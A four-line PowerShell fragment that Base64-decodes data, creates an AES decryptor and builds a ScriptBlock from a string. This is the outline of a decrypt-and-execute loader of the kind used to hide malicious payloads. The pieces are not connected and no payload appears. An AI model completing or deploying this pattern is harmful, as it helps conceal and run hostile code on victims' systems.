$bytes = [Convert]::FromBase64String($data)
$aes = [System.Security.Cryptography.Aes]::Create()
$decryptor = $aes.CreateDecryptor()
[ScriptBlock]::Create($source)
